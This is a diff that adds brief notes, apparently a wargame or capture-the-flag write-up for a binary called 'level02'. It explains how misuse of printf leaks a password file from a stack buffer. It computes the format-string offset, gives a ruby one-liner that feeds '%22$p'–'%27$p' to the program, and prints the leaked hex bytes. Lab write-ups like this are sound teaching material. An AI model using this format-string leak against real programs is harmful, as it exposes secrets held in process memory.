@@ -1,0 +1,11 @@
+- we can use printf bad use to leak .pass file that is loaded inside s2
+- the executable is compiled on 64 bits so each address is 8 bytes long
+
+- s2 @ -0xa0(%rbp) and $rsp @ -0x120(%rbp) -> 128 bytes (/ 8) -> 16$p
+- we need to include 6 registers before reaching the stack
+	- 16 + 6 = 22$p
+
+- s2 is 48 bytes long, we need to print (48 / 8) 6 pointers
+	- ruby -e 'print "%22$p %23$p %24$p %25$p %26$p %27$p\n\n"' | ./level02
+- we can now convert those pointers into a string 
+	- ruby -e 'print "\x48\x68\x37\x34\x52\x50\x6e\x75\x51\x39\x73\x61\x35\x4a\x41\x45\x58\x67\x4e\x57\x43\x71\x7a\x37\x73\x58\x47\x6e\x68\x35\x4a\x35\x4d\x39\x4b\x66\x50\x67\x33\x48\n"'
